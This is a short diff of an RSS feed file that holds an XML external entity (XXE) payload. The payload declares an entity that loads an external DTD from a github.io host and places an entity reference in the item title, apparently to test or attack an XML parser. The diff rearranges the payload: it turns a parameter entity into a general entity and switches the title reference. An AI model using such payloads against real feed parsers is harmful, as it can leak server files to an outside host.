@@ -1,12 +1,11 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-<!ENTITY % xxe SYSTEM "https://annie-te.github.io/external.dtd"> 
-%xxe;
+<!ENTITY xxe SYSTEM "https://annie-te.github.io/external.dtd"> 
 ]>
 <rss version="2.0">
 <channel>
 <item>
-<title>A &string;</title>
+<title>A %string;</title>
 <link>http://example.com</link>
 <description>a post</description>
 <author>author@example.com</author>
